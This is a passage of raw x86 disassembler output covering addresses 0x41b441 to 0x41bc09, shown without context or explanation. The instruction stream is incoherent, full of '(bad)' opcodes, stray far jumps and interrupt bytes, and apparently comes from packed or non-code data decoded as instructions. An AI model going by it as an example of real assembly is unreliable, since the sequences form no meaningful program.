  41b441:	jmp    ecx
  41b443:	add    BYTE PTR [ebx],dl
  41b445:	call   FWORD PTR [ebx]
  41b447:	push   edx
  41b448:	xchg   edx,eax
  41b449:	call   FWORD PTR [ebx]
  41b44b:	push   esp
  41b44c:	dec    DWORD PTR [ecx-0x21]
  41b452:	popf   
  41b453:	(bad)  
  41b454:	notrack call DWORD PTR [ebx]
  41b457:	enter  0xff71,0xe0
  41b45b:	sub    bh,bh
  41b45d:	(bad)  
  41b45e:	cmp    al,BYTE PTR [eax]
  41b460:	add    DWORD PTR [eax],0xffffffd9
  41b463:	call   FWORD PTR [edi]
  41b465:	add    al,ah
  41b467:	mov    bl,ah
  41b469:	int3   
  41b46a:	cli    
  41b46b:	or     eax,0x4889ff
  41b470:	or     esp,0x64
  41b473:	add    dh,bh
  41b475:	add    BYTE PTR [ebp+esi*4+0x1f],cl
  41b479:	cmp    edx,0x5b
  41b47c:	add    bh,bh
  41b47e:	mov    eax,0x2600ff83
  41b483:	jmp    FWORD PTR [edx]
  41b485:	add    BYTE PTR [edx-0x78],dl
  41b488:	sbb    BYTE PTR [eax],al
  41b48a:	test   eax,0xac89ff77
  41b48f:	add    BYTE PTR [eax],al
  41b491:	(bad)  
  41b492:	jl     0x41b417
  41b494:	sbb    BYTE PTR [ebx+0x90062c],al
  41b49a:	jp     0x41b512
  41b49c:	mov    esp,ecx
  41b49e:	pop    ds
  41b49f:	inc    DWORD PTR [eax]
  41b4a1:	int3   
  41b4a2:	sub    bh,bh
  41b4a4:	fld    QWORD PTR [eax]
  41b4a6:	scas   al,BYTE PTR es:[edi]
  41b4a7:	sahf   
  41b4a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4a9:	jmp    DWORD PTR [ebx]
  41b4ab:	jns    0x41b4ad
  41b4ad:	sub    esp,0xffffffff
  41b4b0:	int3   
  41b4b1:	jmp    DWORD PTR [esp+ecx*8+0x2564ccea]
  41b4b8:	push   edx
  41b4b9:	add    BYTE PTR [ebp+0x22],bl
  41b4bc:	inc    DWORD PTR [eax]
  41b4be:	std    
  41b4bf:	mov    edi,edi
  41b4c1:	add    BYTE PTR [ecx+ecx*4-0x80],dh
  41b4c5:	add    BYTE PTR [ecx-0x59],al
  41b4c8:	aad    0x89
  41b4ca:	js     0x41b521
  41b4cc:	add    BYTE PTR [ebx+0x89008a],al
  41b4d2:	popa   
  41b4d3:	call   DWORD PTR [edi-0x1]
  41b4d6:	imul   edx,DWORD PTR [edi],0xffffffee
  41b4d9:	add    BYTE PTR ds:0xe008368,dh
  41b4df:	inc    DWORD PTR [eax]
  41b4e1:	push   DWORD PTR [esi+0x0]
  41b4e4:	xlat   BYTE PTR ds:[ebx]
  41b4e5:	(bad)  
  41b4e6:	cmp    ebp,ebx
  41b4e8:	add    edi,edi
  41b4ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4eb:	mov    DWORD PTR [eax],0xff837700
  41b4f1:	mov    DWORD PTR [ebx-0x7d],edx
  41b4f4:	stos   DWORD PTR es:[edi],eax
  41b4f5:	call   FWORD PTR [edi-0x10]
  41b4f8:	iret   
  41b4f9:	call   DWORD PTR [edi+0x62ff00a5]
  41b4ff:	(bad)  
  41b500:	inc    DWORD PTR [eax]
  41b502:	or     eax,0x36ffbfcc
  41b507:	aaa    
  41b508:	inc    ebp
  41b509:	push   DWORD PTR [esi+0x5b]
  41b50c:	inc    DWORD PTR [ebx-0x11]
  41b512:	sub    edi,edi
  41b514:	mov    ch,0x89
  41b516:	jmp    0xffc7:0xfeff2a62
  41b51d:	jmp    DWORD PTR [edx-0x2c000001]
  41b523:	add    BYTE PTR [ebp-0x1],al
  41b526:	mov    edi,0xe9839faf
  41b52b:	sbb    BYTE PTR [ebx-0x7ce001],al
  41b531:	inc    esp
  41b533:	jmp    FWORD PTR ds:0xf9ad88ff
  41b539:	add    dh,al
  41b53b:	lods   eax,DWORD PTR ds:[esi]
  41b53c:	add    bh,bh
  41b53e:	in     al,dx
  41b53f:	int3   
  41b540:	add    DWORD PTR [eax],0x76
  41b543:	add    BYTE PTR [edx+0x0],ch
  41b546:	or     eax,0x29ffdb81
  41b54b:	aaa    
  41b54c:	add    BYTE PTR [eax],al
  41b54e:	mov    BYTE PTR [eax],0x0
  41b551:	(bad)  
  41b552:	mov    ebx,0x70ff01ff
  41b557:	ds pusha 
  41b559:	add    BYTE PTR [eax],dl
  41b55b:	mov    ds:0x8384ff00,eax
  41b560:	inc    DWORD PTR [eax]
  41b562:	mov    esp,0x57cc6a00
  41b567:	mov    ds:0xce36ccee,eax
  41b56c:	mov    DWORD PTR [ecx-0x76767667],ecx
  41b572:	and    bh,bh
  41b574:	dec    edi
  41b575:	int3   
  41b576:	pop    esi
  41b577:	mov    ebp,0x2ccff43
  41b57c:	inc    DWORD PTR [ebx-0x7c00ae]
  41b582:	push   esp
  41b583:	sbb    eax,0x0
  41b586:	jecxz  0x41b59c
  41b588:	mov    BYTE PTR [eax],0xc0
  41b58b:	mov    bh,0xcc
  41b58d:	(bad)  
  41b58e:	fdiv   st(7),st
  41b590:	cmp    edi,0x5b
  41b593:	sub    DWORD PTR [ecx],0xffffffff
  41b596:	dec    eax
  41b597:	and    eax,0x33faff5c
  41b59c:	add    BYTE PTR [eax],al
  41b59e:	cmp    al,BYTE PTR [ebx-0x637c01]
  41b5a4:	ret    
  41b5a5:	call   esi
  41b5a7:	inc    edi
  41b5a8:	lahf   
  41b5a9:	call   FWORD PTR [ebx+edi*2-0xd3337d]
  41b5b0:	add    bh,bh
  41b5b2:	sbb    edi,edi
  41b5b4:	and    bh,bh
  41b5b6:	repz or eax,0x3def83de
  41b5bc:	add    BYTE PTR [ebx-0xff3304],al
  41b5c2:	adc    BYTE PTR [eax],al
  41b5c4:	sub    eax,DWORD PTR [eax]
  41b5c6:	mov    esp,0x98006f0f
  41b5cb:	pop    ecx
  41b5cc:	mov    edi,edi
  41b5ce:	dec    edx
  41b5cf:	(bad)  
  41b5d0:	(bad)  
  41b5d1:	jmp    FWORD PTR [edi-0x1]
  41b5d4:	pusha  
  41b5d5:	int3   
  41b5d6:	pop    ds
  41b5d7:	jo     0x41b59a
  41b5d9:	inc    DWORD PTR [ecx+0x1bffff09]
  41b5df:	dec    esp
  41b5e1:	inc    ebx
  41b5e3:	add    BYTE PTR [edi-0x77],dh
  41b5e6:	mov    edx,0x2acc6292
  41b5eb:	fiadd  WORD PTR [ebx+0x8338ff]
  41b5f1:	add    DWORD PTR [edx-0x5e00a900],0x23
  41b5f8:	pop    ecx
  41b5f9:	call   FWORD PTR [edi+0x6c83cc41]
  41b5ff:	cmp    edi,0x0
  41b602:	xor    eax,0x44003bff
  41b607:	stc    
  41b608:	repz call DWORD PTR [eax+ecx*8]
  41b60c:	cmp    edi,0x49
  41b60f:	(bad)  
  41b610:	inc    DWORD PTR [eax]
  41b612:	mov    ebx,0xecff6bff
  41b617:	or     edx,DWORD PTR [edx-0xd23e01]
  41b61d:	add    cl,bh
  41b61f:	cmp    edi,0xffffffff
  41b622:	jecxz  0x41b5f0
  41b624:	jecxz  0x41b5a9
  41b626:	mov    ds:0x6800a8e5,eax
  41b62b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b62c:	add    BYTE PTR [ebx+0x89ff8f],al
  41b632:	mov    edi,0x6fffe1ff
  41b637:	(bad)  
  41b638:	fdiv   st(7),st
  41b63a:	int    0x5c
  41b63c:	inc    DWORD PTR [eax]
  41b63e:	les    eax,FWORD PTR [ebx-0x87d00]
  41b644:	rol    BYTE PTR [ebx-0x7c48cdaa],cl
  41b64a:	sbb    DWORD PTR [ecx-0x33760001],ebx
  41b650:	add    BYTE PTR [ebx-0x7ca5001f],al
  41b656:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41b658:	test   bh,bh
  41b65a:	out    0x24,eax
  41b65c:	inc    DWORD PTR [eax]
  41b65e:	and    al,BYTE PTR [eax]
  41b660:	(bad)  
  41b661:	jmp    FWORD PTR [ecx]
  41b663:	add    dh,bl
  41b665:	(bad)  
  41b666:	fucomi st,st(3)
  41b668:	add    DWORD PTR [ebx-0x7c23ba],0xff0083e6
  41b672:	jno    0x41b674
  41b674:	add    edi,edi
  41b676:	gs pop ebx
  41b678:	dec    edi
  41b679:	call   DWORD PTR [ebp+0x4effcc75]
  41b67f:	(bad)  
  41b680:	(bad)  
  41b681:	dec    edx
  41b683:	int3   
  41b684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b685:	push   DWORD PTR [edi+0x44]
  41b688:	fmul   QWORD PTR [ecx-0x33768eb6]
  41b68e:	jecxz  0x41b68f
  41b690:	inc    DWORD PTR [ebx+0x4aff49]
  41b696:	ins    BYTE PTR es:[edi],dx
  41b697:	mov    esi,0x5c17ff5e
  41b69c:	int3   
  41b69d:	add    BYTE PTR [eax-0x34],cl
  41b6a0:	add    BYTE PTR [ebx+0x8500b8],al
  41b6a6:	mov    eax,0xfeff6485
  41b6ab:	out    dx,eax
  41b6ac:	add    BYTE PTR [eax],al
  41b6ae:	(bad)  
  41b6b1:	dec    DWORD PTR [ecx-0x6900aa7d]
  41b6b7:	jg     0x41b64b
  41b6b9:	push   esi
  41b6bb:	retf   
  41b6bc:	add    DWORD PTR [ebx+0x83ffec],0xffffffd8
  41b6c3:	add    BYTE PTR [eax-0x38e6a001],bl
  41b6c9:	add    ah,bl
  41b6cb:	out    dx,eax
  41b6cc:	int3   
  41b6cd:	sub    DWORD PTR [ebp-0x1],0xffffffff
  41b6d1:	(bad)  
  41b6d2:	fiadd  WORD PTR [ebx-0x7af500af]
  41b6d8:	add    DWORD PTR gs:[ecx+0x8],0x0
  41b6dd:	jmp    ecx
  41b6df:	dec    esp
  41b6e1:	add    BYTE PTR [ebp-0x6200cc7d],ch
  41b6e7:	jmp    0x41b731
  41b6e9:	(bad)  
  41b6ea:	cli    
  41b6eb:	call   0xffd4b5f0
  41b6f0:	add    BYTE PTR [ecx-0x89ffbb],cl
  41b6f6:	and    ah,BYTE PTR [ebp+0x53]
  41b6f9:	jmp    esi
  41b6fb:	cmc    
  41b6fc:	(bad)  
  41b6fd:	jmp    FWORD PTR [esi-0x3eff7d00]
  41b703:	push   DWORD PTR [ebx-0x1]
  41b706:	arpl   WORD PTR [eax-0xf],di
  41b709:	sbb    DWORD PTR [ebx+0x23],0xffffff83
  41b70d:	call   FWORD PTR [eax+0x61ff8900]
  41b713:	int3   
  41b714:	mov    eax,ds:0x8eeffc89
  41b719:	push   DWORD PTR [ecx]
  41b71b:	loope  0x41b71c
  41b71d:	jmp    FWORD PTR [edx-0x3c7c7c01]
  41b723:	inc    DWORD PTR [esi-0x2513ab01]
  41b729:	add    bl,bh
  41b72b:	push   esi
  41b72c:	mov    DWORD PTR [ecx+0xff008f],ecx
  41b732:	scas   eax,DWORD PTR es:[edi]
  41b733:	int3   
  41b734:	xchg   ecx,eax
  41b735:	int3   
  41b736:	ds scas eax,DWORD PTR es:[edi]
  41b738:	adc    ah,cl
  41b73a:	loop   0x41b775
  41b73c:	mov    DWORD PTR [ebx+0xff834d],eax
  41b742:	mov    al,BYTE PTR [eax]
  41b744:	dec    esi
  41b745:	add    BYTE PTR [ecx-0x41],ah
  41b748:	cli    
  41b749:	xor    esi,0xffffff9c
  41b74c:	mov    edi,edi
  41b74e:	xor    edi,edi
  41b750:	add    DWORD PTR [eax],0xffffffe3
  41b753:	add    cl,ah
  41b755:	jmp    FWORD PTR [edi]
  41b757:	hlt    
  41b758:	add    DWORD PTR [eax],0xff858f
  41b75e:	push   es
  41b75f:	dec    esp
  41b761:	inc    DWORD PTR [eax]
  41b763:	cmp    eax,0x0
  41b766:	int3   
  41b767:	into   
  41b768:	cmp    bh,0x95
  41b76b:	fdivp  st(7),st
  41b76d:	add    BYTE PTR [eax+0x708900ff],dl
  41b773:	or     DWORD PTR [edi+0x1215aeff],0xffffff83
  41b77a:	lods   eax,DWORD PTR ds:[esi]
  41b77b:	mov    ecx,0xff860083
  41b780:	add    ah,cl
  41b782:	push   ecx
  41b783:	add    dl,bh
  41b785:	call   FWORD PTR [ebx-0x3b]
  41b788:	(bad)  
  41b789:	add    BYTE PTR [edx+ebp*8-0x1],dl
  41b78d:	add    bl,dl
  41b78f:	cmp    edi,0x0
  41b792:	inc    eax
  41b793:	sbb    DWORD PTR [edx+0x0],0x2b
  41b797:	adc    DWORD PTR [ecx-0x1],ebx
  41b79a:	jmp    0x630eb6cb
  41b79f:	add    bh,bh
  41b7a1:	add    BYTE PTR [eax],bh
  41b7a3:	(bad)  
  41b7a4:	inc    DWORD PTR [ebx-0x9169ed]
  41b7aa:	fs cmp edi,edi
  41b7ad:	add    dl,ch
  41b7af:	add    bh,bh
  41b7b1:	dec    DWORD PTR [edi+edi*8-0x7ac000c]
  41b7b8:	mov    ah,0x0
  41b7ba:	arpl   sp,si
  41b7bc:	add    BYTE PTR [eax],al
  41b7be:	es (bad) 
  41b7c0:	(bad)  
  41b7c1:	push   DWORD PTR [edx+0x0]
  41b7c4:	and    eax,DWORD PTR [ebx-0x3363f1cb]
  41b7ca:	fdivr  QWORD PTR [edi+edi*8]
  41b7cd:	call   FWORD PTR ds:0xc600ffff
  41b7d3:	int3   
  41b7d4:	fdivp  st(7),st
  41b7d6:	lahf   
  41b7d7:	fs push esi
  41b7d9:	push   DWORD PTR [edi]
  41b7db:	addr16 cmp edi,0x55
  41b7df:	int3   
  41b7e0:	(bad)  
  41b7e1:	inc    DWORD PTR [edi+0x1ecc5700]
  41b7e7:	dec    ebx
  41b7e8:	jne    0x41b7ea
  41b7ea:	outs   dx,DWORD PTR ds:[esi]
  41b7eb:	out    dx,eax
  41b7ec:	(bad)  
  41b7ed:	call   FWORD PTR [ebx-0x13010000]
  41b7f3:	add    BYTE PTR [edx],ch
  41b7f5:	dec    DWORD PTR [ebx+0x8]
  41b7f8:	inc    esi
  41b7f9:	(bad)  
  41b7fa:	mov    eax,0x9890059
  41b7ff:	inc    DWORD PTR [eax]
  41b801:	mov    DWORD PTR [edi+0x0],esp
  41b804:	jl     0x41b805
  41b806:	xlat   BYTE PTR ds:[ebx]
  41b807:	mov    cl,0xd4
  41b809:	sbb    DWORD PTR [ebx+0x62],0xffffffff
  41b80d:	(bad)  
  41b80e:	jle    0x41b793
  41b810:	(bad)  
  41b811:	inc    DWORD PTR [eax]
  41b813:	(bad)  
  41b814:	fld    DWORD PTR [eax]
  41b816:	fwait
  41b817:	xchg   DWORD PTR [edi+edi*8],edi
  41b81a:	xor    edi,DWORD PTR [ebp-0x34]
  41b81d:	call   FWORD PTR [eax]
  41b81f:	(bad)  
  41b820:	inc    DWORD PTR [eax]
  41b822:	ja     0x41b7a7
  41b824:	rol    DWORD PTR [eax],cl
  41b826:	and    BYTE PTR [ebp+ebx*8-0x7d],0x7e
  41b82b:	mov    edi,0xcc8aff83
  41b830:	inc    DWORD PTR [ebx-0xcfff79]
  41b836:	xchg   DWORD PTR [eax-0x59c3ff30],eax
  41b83c:	add    bh,bh
  41b83e:	mov    ebx,0x888300ff
  41b843:	call   DWORD PTR [ebx-0x1]
  41b846:	int    0xda
  41b848:	sub    al,0x0
  41b84a:	mov    esp,0x260083d1
  41b84f:	(bad)  
  41b850:	(bad)  
  41b851:	push   DWORD PTR [ecx-0x1]
  41b854:	inc    esi
  41b855:	mov    DWORD PTR [esi],eax
  41b857:	cmp    DWORD PTR [ebp-0x1ba87d],ebp
  41b85d:	jmp    FWORD PTR [edi]
  41b85f:	add    BYTE PTR [ebx-0x37ff5601],al
  41b865:	int3   
  41b866:	cmp    bl,bl
  41b868:	inc    edx
  41b869:	(bad)  
  41b86a:	fcomp  DWORD PTR [edi-0x6bff34]
  41b870:	inc    DWORD PTR [ebx+0x7fff7f]
  41b876:	xor    ebp,esi
  41b878:	out    0x0,al
  41b87a:	call   0xff00:0xf200ff7f
  41b881:	(bad)  
  41b882:	inc    BYTE PTR [ebx+0x6804ff24]
  41b888:	cmp    al,0xff
  41b88a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b88b:	push   esp
  41b88c:	add    bh,bh
  41b88e:	add    al,0x0
  41b890:	inc    DWORD PTR [eax]
  41b892:	inc    BYTE PTR [eax]
  41b894:	hlt    
  41b895:	add    BYTE PTR [eax+ebp*4-0x7e],dl
  41b899:	and    ebx,0xffffff8e
  41b89c:	add    BYTE PTR [eax],al
  41b89e:	je     0x41b89f
  41b8a0:	add    BYTE PTR [eax],al
  41b8a2:	jle    0x41b8a4
  41b8a4:	out    dx,eax
  41b8a5:	dec    ebx
  41b8a7:	mov    ebp,ecx
  41b8a9:	(bad)  
  41b8aa:	fidiv  DWORD PTR [eax+0x0]
  41b8ad:	add    BYTE PTR ds:0x2483ff00,bh
  41b8b3:	push   DWORD PTR [eax-0x34]
  41b8b6:	sbb    esi,ecx
  41b8b8:	mov    eax,0xff0d9eff
  41b8bd:	sbb    DWORD PTR [eax-0x50007601],0xffffff83
  41b8c4:	icebp  
  41b8c5:	add    BYTE PTR [ebp+edx*2+0x4b],dh
  41b8c9:	push   DWORD PTR [edx-0x2c000095]
  41b8cf:	(bad)  
  41b8d0:	(bad)  
  41b8d1:	inc    DWORD PTR [ebx-0x1]
  41b8d4:	mov    bh,bh
  41b8d6:	fisttp QWORD PTR [eax+0x51]
  41b8d9:	add    BYTE PTR [esi-0x6a],dl
  41b8dc:	inc    DWORD PTR [eax]
  41b8de:	repz add bh,bh
  41b8e1:	add    dh,dh
  41b8e3:	int3   
  41b8e4:	test   al,0xff
  41b8e6:	scas   al,BYTE PTR es:[edi]
  41b8e7:	fstp   st(1)
  41b8e9:	jmp    DWORD PTR [esi-0x53000064]
  41b8ef:	add    bh,bh
  41b8f1:	cmp    DWORD PTR [ecx-0x77],0x55
  41b8f5:	add    BYTE PTR [esi-0x6d7cea0f],al
  41b8fb:	mov    bl,0xcc
  41b8fd:	mov    DWORD PTR [esi-0x7d],ecx
  41b900:	add    bh,bh
  41b902:	imul   edi,edi,0xffffffdb
  41b905:	add    BYTE PTR [eax-0x46],al
  41b908:	sub    bh,bh
  41b90a:	cli    
  41b90b:	xor    DWORD PTR [eax],eax
  41b90d:	int3   
  41b90e:	nop
  41b90f:	(bad)  
  41b910:	dec    DWORD PTR [ecx-0x7c6f0031]
  41b916:	dec    ebx
  41b917:	test   DWORD PTR [esi+0x0],ebp
  41b91a:	or     bh,cl
  41b91c:	add    BYTE PTR [eax],al
  41b91e:	std    
  41b91f:	cmp    edi,0xffffffff
  41b922:	jp     0x41b923
  41b924:	pop    eax
  41b925:	jmp    FWORD PTR [edx+0xc]
  41b928:	pop    edx
  41b929:	int3   
  41b92a:	lahf   
  41b92b:	mov    es,WORD PTR [ebx-0x2d01]
  41b931:	(bad)  
  41b932:	jnp    0x41b8b7
  41b934:	fiadd  WORD PTR [eax]
  41b936:	xor    al,0x9e
  41b938:	add    DWORD PTR [eax],0xffffffa0
  41b93b:	cmp    al,BYTE PTR [eax]
  41b93d:	add    BYTE PTR [ebp+0x2600ffff],dh
  41b943:	add    BYTE PTR [esi+0x66da0900],dl
  41b949:	(bad)  
  41b94a:	mov    esi,0xe2ccff8a
  41b94f:	inc    DWORD PTR [ebx-0x3ffbc01]
  41b955:	dec    DWORD PTR [ebp+0x54ffeb41]
  41b95b:	push   edi
  41b95c:	add    bh,bh
  41b95e:	cwde   
  41b95f:	add    BYTE PTR [ebx-0x42005800],al
  41b965:	dec    DWORD PTR [edi]
  41b967:	outs   dx,BYTE PTR ds:[esi]
  41b968:	add    DWORD PTR [eax],eax
  41b96a:	pop    es
  41b96b:	pop    es
  41b96c:	dec    esp
  41b96e:	jecxz  0x41b970
  41b970:	add    BYTE PTR [eax],al
  41b972:	aad    0x0
  41b974:	call   0x3083:0x951600ff
  41b97b:	push   0xccd88383
  41b980:	add    BYTE PTR [ebx+0x8ffd2],al
  41b986:	pop    ebp
  41b987:	fstp   st(5)
  41b989:	or     DWORD PTR ds:0x3a83fffb,0xffffffff
  41b990:	inc    DWORD PTR [eax]
  41b992:	out    0xff,al
  41b994:	mov    edi,0x1576d5cc
  41b999:	dec    DWORD PTR [esi+0x4300cc07]
  41b99f:	inc    DWORD PTR [eax]
  41b9a1:	add    BYTE PTR [eax-0x1],ch
  41b9a4:	ret    0xc300
  41b9a7:	loop   0x41b997
  41b9a9:	(bad)  
  41b9aa:	fdiv   st,st(2)
  41b9ac:	add    BYTE PTR [eax],al
  41b9ae:	enter  0xffff,0x0
  41b9b2:	add    edi,edi
  41b9b4:	xchg   edx,eax
  41b9b5:	sub    DWORD PTR [edi-0x24],0x8
  41b9b9:	int3   
  41b9ba:	inc    esi
  41b9bb:	ins    BYTE PTR es:[edi],dx
  41b9bc:	(bad)  
  41b9bd:	inc    ebp
  41b9bf:	or     esp,0xffffff83
  41b9c2:	(bad)  
  41b9c4:	cmp    al,0xcc
  41b9c6:	or     ch,BYTE PTR [ebx+0x31]
  41b9c9:	(bad)  
  41b9ca:	fsubr  QWORD PTR [eax+eax*1-0x1]
  41b9ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9cf:	add    BYTE PTR [eax],al
  41b9d1:	jmp    FWORD PTR [ebx-0x1]
  41b9d4:	(bad)  
  41b9d6:	jecxz  0x41ba0d
  41b9d8:	outs   dx,BYTE PTR ds:[esi]
  41b9d9:	add    ch,al
  41b9db:	and    DWORD PTR [eax],eax
  41b9dd:	(bad)  
  41b9de:	jnp    0x41b963
  41b9e0:	mov    DWORD PTR [eax],eax
  41b9e2:	xor    eax,DWORD PTR [eax]
  41b9e4:	push   ecx
  41b9e5:	jmp    edi
  41b9e7:	xchg   DWORD PTR [eax+eax*1],ebx
  41b9ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9eb:	jo     0x41b9ec
  41b9ed:	add    BYTE PTR [eax+0x3a00ff00],dl
  41b9f3:	jmp    ecx
  41b9f5:	mov    DWORD PTR [eax],ecx
  41b9f7:	psubsb mm0,QWORD PTR [eax]
  41b9fa:	xor    al,0xeb
  41b9fc:	(bad)  
  41b9fd:	call   FWORD PTR [edi+edi*8+0x45ff00]
  41ba04:	and    eax,0xeb7ed000
  41ba09:	add    BYTE PTR [ebp-0x7d],bh
  41ba0c:	dec    DWORD PTR [ecx-0x42]
  41ba12:	sbb    bh,bh
  41ba14:	cwde   
  41ba15:	int3   
  41ba16:	xlat   BYTE PTR ds:[ebx]
  41ba17:	sbb    edi,DWORD PTR [ebp-0x765ee401]
  41ba1d:	add    bl,bl
  41ba1f:	dec    esp
  41ba21:	add    BYTE PTR [edx],cl
  41ba23:	push   DWORD PTR [ebx]
  41ba25:	adc    DWORD PTR [ecx+eax*8-0x7b36ff4f],0xffffff83
  41ba2d:	dec    DWORD PTR [ebx]
  41ba2f:	add    BYTE PTR [ebx+0x35ffb9ff],al
  41ba35:	sub    DWORD PTR [edi-0x5d00b6a4],0xffffffaf
  41ba3c:	add    BYTE PTR [ebx-0x7c3318],al
  41ba42:	mov    dl,0x0
  41ba44:	in     eax,dx
  41ba45:	mov    DWORD PTR [edi+0x5b],ebp
  41ba48:	xchg   BYTE PTR [eax],al
  41ba4a:	push   esi
  41ba4b:	inc    ecx
  41ba4c:	add    BYTE PTR [eax],al
  41ba4e:	xchg   edx,eax
  41ba4f:	inc    DWORD PTR [eax]
  41ba51:	call   DWORD PTR [ecx]
  41ba53:	sub    ebx,0xffffffff
  41ba56:	sbb    edx,esp
  41ba58:	inc    ecx
  41ba59:	or     ecx,0x26
  41ba5c:	add    DWORD PTR [eax],0x18
  41ba5f:	or     DWORD PTR [ecx+0x47005eff],0x0
  41ba66:	jae    0x41ba47
  41ba68:	sub    eax,DWORD PTR [eax]
  41ba6a:	mov    ch,0x6d
  41ba6c:	add    ah,cl
  41ba6e:	pop    eax
  41ba6f:	dec    DWORD PTR [ecx+0x60007100]
  41ba75:	add    BYTE PTR [edi],al
  41ba77:	dec    ebp
  41ba78:	test   bh,bh
  41ba7a:	sub    ebx,DWORD PTR [ebp-0x7c060000]
  41ba80:	add    DWORD PTR [eax],0xfffffff5
  41ba83:	or     DWORD PTR [ecx+0x9092d00],0x0
  41ba8a:	push   cs
  41ba8b:	mov    ds:0xff400083,eax
  41ba90:	add    BYTE PTR [eax],al
  41ba92:	into   
  41ba93:	(bad)  
  41ba94:	fild   DWORD PTR [eax]
  41ba96:	mov    ebx,0x69cc5f82
  41ba9b:	sbb    eax,0x833cffff
  41baa0:	(bad)  
  41baa1:	call   edx
  41baa3:	add    BYTE PTR [edi+edi*8],bl
  41baa6:	(bad)  
  41baa8:	test   eax,0x2f6bff
  41baad:	call   FWORD PTR [esi]
  41baaf:	inc    DWORD PTR [eax]
  41bab1:	add    BYTE PTR [ebp-0x2e334d77],bh
  41bab7:	jno    0x41bb11
  41bab9:	call   DWORD PTR [ecx+0x1f83ff0a]
  41babf:	add    bh,bh
  41bac1:	(bad)  
  41bac2:	mov    ecx,0xfd8911ff
  41bac7:	ins    DWORD PTR es:[edi],dx
  41bac8:	xor    DWORD PTR [eax],eax
  41baca:	imul   edi,DWORD PTR [edi+edi*8+0xff65ff],0x38008cff
  41bad5:	add    BYTE PTR [eax+0x3bff2410],cl
  41badb:	(bad)  
  41badc:	add    bh,bh
  41bade:	xor    eax,0xe830083
  41bae3:	call   DWORD PTR [edi]
  41bae5:	dec    DWORD PTR [esi-0x167cd529]
  41baeb:	aaa    
  41baec:	add    bh,bh
  41baee:	cmc    
  41baef:	add    BYTE PTR [ecx+0x75fff800],cl
  41baf5:	jmp    FWORD PTR [esi]
  41baf7:	lock popf 
  41baf9:	mov    DWORD PTR [ebp-0x39],esi
  41bafc:	(bad)  
  41bafd:	(bad)  
  41bafe:	jmp    0x1e42bacf
  41bb03:	jmp    DWORD PTR [ebx+0x6e953a89]
  41bb09:	push   DWORD PTR [edx+0x5c0089dd]
  41bb0f:	(bad)  
  41bb10:	inc    DWORD PTR [ebx+0xc7ff3d]
  41bb16:	mov    DWORD PTR [edi+ebx*1+0x0],edi
  41bb1a:	(bad)  
  41bb1b:	ins    DWORD PTR es:[edi],dx
  41bb1c:	add    DWORD PTR [eax],0x18
  41bb1f:	add    bh,bh
  41bb21:	(bad)  
  41bb22:	notrack call DWORD PTR [esi-0x1]
  41bb26:	lds    ecx,FWORD PTR cs:[edx-0x7d]
  41bb2a:	div    DWORD PTR [ebp-0x80000]
  41bb30:	mov    edi,edi
  41bb32:	mov    bh,bh
  41bb34:	popa   
  41bb35:	add    BYTE PTR [ebx+0x2e],bl
  41bb38:	push   eax
  41bb39:	call   FWORD PTR [esp+eiz*2-0xcd0100]
  41bb40:	(bad)  
  41bb41:	jmp    ebx
  41bb43:	jmp    FWORD PTR [eax]
  41bb45:	call   DWORD PTR [edi]
  41bb47:	aad    0x66
  41bb49:	call   ebx
  41bb4b:	(bad)  
  41bb4d:	add    dl,dl
  41bb4f:	add    bh,bh
  41bb51:	add    BYTE PTR [edi+0x3cffa6cc],ch
  41bb57:	repz inc BYTE PTR [ebx-0xff146a]
  41bb5e:	enter  0x0,0x0
  41bb62:	(bad)  
  41bb63:	(bad)  
  41bb64:	out    dx,eax
  41bb65:	int3   
  41bb66:	sbb    BYTE PTR [ebx],bh
  41bb68:	xchg   ecx,eax
  41bb69:	call   FWORD PTR ds:0x10cc00a2
  41bb6f:	inc    DWORD PTR [eax]
  41bb71:	(bad)  
  41bb72:	mov    esi,0x41ff84ff
  41bb77:	retf   0x897d
  41bb7a:	mov    bh,0xa1
  41bb7c:	inc    DWORD PTR [eax]
  41bb7e:	fwait
  41bb7f:	add    BYTE PTR [eax],al
  41bb81:	jmp    DWORD PTR [edi-0x1]
  41bb84:	pop    ebx
  41bb85:	inc    ecx
  41bb87:	jb     0x41bb4c
  41bb89:	mov    DWORD PTR [ecx],esp
  41bb8b:	jp     0x41bb8c
  41bb8d:	adc    DWORD PTR [ebp-0x1],0x0
  41bb91:	push   DWORD PTR [ebp+0x1a00d5ff]
  41bb97:	jp     0x41bb5c
  41bb99:	jmp    FWORD PTR [esi+0x28ffff10]
  41bb9f:	dec    DWORD PTR [ecx+0xa899300]
  41bba5:	jmp    FWORD PTR [esi+edx*1]
  41bba8:	mov    bl,0xcc
  41bbaa:	jge    0x41bb46
  41bbac:	inc    DWORD PTR [eax]
  41bbae:	cmp    al,BYTE PTR [eax]
  41bbb0:	(bad)  
  41bbb1:	inc    DWORD PTR [edi]
  41bbb3:	add    dl,al
  41bbb5:	jmp    FWORD PTR [esi]
  41bbb7:	inc    ebx
  41bbb8:	xor    eax,0xff02c300
  41bbbd:	dec    ebx
  41bbbf:	dec    esp
  41bbc1:	mov    DWORD PTR [ebp+0x728946ff],ecx
  41bbc7:	loopne 0x41bbe7
  41bbc9:	int3   
  41bbca:	cmp    al,0x9b
  41bbcc:	add    DWORD PTR [ebx-0x33003374],0xfffffff5
  41bbd3:	jmp    FWORD PTR [esi+0x394dd6ff]
  41bbd9:	push   DWORD PTR [ebx+0x680000af]
  41bbdf:	add    bh,bh
  41bbe1:	sbb    DWORD PTR ds:0x22ff0cff,0xfffffffb
  41bbe8:	inc    esi
  41bbe9:	dec    DWORD PTR [ecx-0x26ff005f]
  41bbef:	cmp    edi,0xffffffff
  41bbf2:	pop    ebp
  41bbf3:	push   DWORD PTR [ebx+0x6c79c500]
  41bbf9:	mov    esi,edx
  41bbfb:	pop    eax
  41bbfc:	int3   
  41bbfd:	inc    ecx
  41bbff:	add    bh,bh
  41bc01:	(bad)  
  41bc02:	jnp    0x41bc03
  41bc04:	fs add bl,ch
  41bc07:	cmp    ebx,esi
  41bc09:	add    BYTE PTR [ecx+ecx*2-0x1],cl
